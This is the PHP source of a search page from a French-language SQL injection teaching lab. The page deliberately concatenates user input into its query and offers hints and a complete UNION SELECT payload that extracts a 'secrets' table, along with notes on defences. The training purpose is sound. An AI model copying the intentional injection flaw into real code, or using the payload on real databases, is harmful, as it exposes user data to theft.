<?php
require_once 'config.php';

if (!isLoggedIn()) {
    redirect('login.php');
}

$results = [];
$error = '';
$query_displayed = '';

if (isset($_GET['search'])) {
    $search = $_GET['search'];
    
    // VULNERABLE: Concaténation directe
    $query = "SELECT users.username, users.email, users.role FROM users WHERE username LIKE '%$search%'";
    
    logQuery($query);
    
    try {
        $db = getDB();
        $stmt = $db->query($query);
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        if (DEBUG_MODE) {
            $query_displayed = $query;
        }
        
    } catch (PDOException $e) {
        $error = showError("Erreur de recherche", $e->getMessage());
        if (DEBUG_MODE) {
            $query_displayed = $query;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recherche - SQL Injection Lab</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <h1> Recherche d'utilisateurs</h1>
            <p class="subtitle">Scénario 2: Data Extraction</p>
        </header>

        <nav class="navigation">
            <a href="dashboard.php">Dashboard</a>
            <a href="search.php" class="active">Recherche</a>
            <a href="profile.php">Profil</a>
            <?php if (isAdmin()): ?>
                <a href="admin.php">Admin Panel</a>
            <?php endif; ?>
            <a href="logout.php">Déconnexion</a>
        </nav>

        <div class="content">
            <div class="card">
                <h2>Rechercher un utilisateur</h2>
                
                <form method="GET" action="">
                    <div class="form-group">
                        <label for="search">Nom d'utilisateur</label>
                        <input 
                            type="text" 
                            id="search" 
                            name="search" 
                            placeholder="Rechercher..."
                            value="<?php echo htmlspecialchars($_GET['search'] ?? ''); ?>"
                        >
                    </div>
                    <button type="submit" class="btn btn-primary">Rechercher</button>
                </form>

                <?php if ($error): ?>
                    <?php echo $error; ?>
                <?php endif; ?>

                <?php if ($query_displayed): ?>
                    <div class="debug">
                        <strong> Requête SQL exécutée:</strong>
                        <pre><?php echo htmlspecialchars($query_displayed); ?></pre>
                    </div>
                <?php endif; ?>

                <?php if (isset($_GET['search'])): ?>
                    <div class="results-section">
                        <h3>Résultats (<?php echo count($results); ?>)</h3>
                        
                        <?php if (count($results) > 0): ?>
                            <table class="results-table">
                                <thead>
                                    <tr>
                                        <th>Utilisateur</th>
                                        <th>Email</th>
                                        <th>Rôle</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($results as $user): ?>
                                        <tr>
                                            <td><?php echo htmlspecialchars($user['username']); ?></td>
                                            <td><?php echo htmlspecialchars($user['email']); ?></td>
                                            <td>
                                                <span class="badge badge-<?php echo $user['role']; ?>">
                                                    <?php echo htmlspecialchars($user['role']); ?>
                                                </span>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        <?php else: ?>
                            <p>Aucun résultat trouvé</p>
                        <?php endif; ?>
                    </div>
                <?php endif; ?>
            </div>

            <div class="card hints-section">
                <h3> Objectif</h3>
                <p>Extraire des données de la table <code>secrets</code> auxquelles vous ne devriez pas avoir accès</p>

                <details>
                    <summary>Indice 1: Structure de la requête</summary>
                    <p>La requête de recherche ressemble à:</p>
                    <pre>SELECT users.username, users.email, users.role 
FROM users 
WHERE username LIKE '%[votre_recherche]%'</pre>
                </details>

                <details>
                    <summary>Indice 2: UNION SELECT</summary>
                    <p>En SQL, <code>UNION</code> permet de combiner les résultats de plusieurs requêtes</p>
                    <p>Exemple: <code>SELECT col1, col2 FROM table1 UNION SELECT col1, col2 FROM table2</code></p>
                </details>

                <details>
                    <summary>Indice 3: Commenter la suite</summary>
                    <p>Utilisez <code>--</code> pour commenter le reste de la requête</p>
                    <p>Essayez: <code>' UNION SELECT username, secret_data, 'leak' FROM secrets--</code></p>
                </details>

                <details>
                    <summary>💡 Solution complète</summary>
                    <div class="solution-box">
                        <p><strong>Payload:</strong></p>
                        <pre>' UNION SELECT username, secret_data, 'extracted' FROM secrets JOIN users ON secrets.user_id = users.id--</pre>
                        <p><strong>Requête résultante:</strong></p>
                        <pre>SELECT users.username, users.email, users.role 
FROM users 
WHERE username LIKE '%' UNION SELECT username, secret_data, 'extracted' 
FROM secrets JOIN users ON secrets.user_id = users.id--%'</pre>
                        <p>Cette requête combine les résultats de la recherche normale avec tous les secrets de la base !</p>
                    </div>
                </details>
            </div>

            <div class="card learning-section">
                <h3> Technique: UNION-based SQL Injection</h3>
                <p>Cette technique permet d'extraire des données de n'importe quelle table en combinant:</p>
                <ol>
                    <li>La requête originale (qu'on peut annuler)</li>
                    <li>Notre propre requête avec UNION</li>
                    <li>Un commentaire pour éliminer la fin de la requête originale</li>
                </ol>

                <h4>Conditions nécessaires:</h4>
                <ul>
                    <li>Le nombre de colonnes doit être le même</li>
                    <li>Les types de données doivent être compatibles</li>
                </ul>

                <h4>Protection:</h4>
                <ul>
                    <li> Requêtes préparées (paramétrisées)</li>
                    <li> Validation stricte des entrées</li>
                    <li> Principe du moindre privilège (least privilege)</li>
                    <li> Désactiver les messages d'erreur détaillés</li>
                </ul>
            </div>
        </div>

        <footer>
            <p>Lab DIABLE v3.0 - DSI ISFA 2025-2026</p>
        </footer>
    </div>
</body>
</html>